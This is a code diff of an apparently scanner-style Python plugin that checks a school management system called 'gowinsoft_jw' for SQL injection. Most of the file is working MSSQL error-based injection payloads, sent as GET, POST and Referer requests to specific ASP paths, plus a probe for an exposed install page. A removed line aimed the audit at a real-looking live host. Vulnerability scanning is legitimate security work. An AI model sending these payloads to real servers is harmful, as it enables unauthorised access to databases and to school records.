@@ -36,12 +36,13 @@ def audit(arg):
         arg + 'jiaoshi/xueji/shen/autobh.asp?jh=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
         arg + 'jiaoshi/xueji/zhuce/iszhuce.asp?xuehao=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
         arg + 'jiaoshi/xueji/xueji/dealfxue.asp?cmdok=1&id=1%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))',
-        
+
     ]
     for payload in payloads1:
         code, head, res, err, _ = curl.curl2(payload)
         if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
             security_hole('SQL injection: ' + payload)
+            return arg
     #post型
     payloads2 = [
         arg + 'web/web/kebiao/kebiao.asp',
@@ -60,13 +61,15 @@ def audit(arg):
         #print res
         if code !=0 and 'GAO JI@Microsoft SQL Server' in res:
             security_hole('SQL injection: ' + payload + " POST: "+post)
+            return arg
     payload2_1 = arg + 'web/web/wenzhai/shoushow.asp'
     content_type = 'Content-Type: application/x-www-form-urlencoded'
     post2_1 = 'xz=%B0%B4%C4%DA%C8%DD&cha=1%27+and+1%3Dconvert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B%40%40version%29%29+and+%27%25%27%3D%27&submit1=%B2%E9%D1%AF'
     code, head, res, err, _ = curl.curl2(payload2_1, post=post2_1, referer=payload2_1, header=content_type)
     if code != 0 and 'GAOJIMicrosoft SQL Server' in res:
         security_hole('SQL injection: ' + payload2_1 + " POST: "+post2_1)
-    
+        return arg
+
     #奇葩型（需要http referer头的get型）
     payloads3 = [
         arg + 'web/web/lanmu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
@@ -82,6 +85,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(payloads3[i], referer=referers[i])
         if code !=0 and 'GAO JI@Microsoft SQL Server' in res:
             security_hole('SQL injection: ' + payloads3[i] + " Referer: "+referers[i])
+            return arg
 
     #目录遍历
     code, head, res, err, _ = curl.curl2(arg + 'install/mzzup.asp')
@@ -89,6 +93,7 @@ def audit(arg):
     if code == 200 and 'admin.asp' in res:
         security_info('目录遍历: ' + arg + 'install/mzzup.asp')
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('gowinsoft_jw', 'http://www.cdtlgcxx.com:2110/')[1])
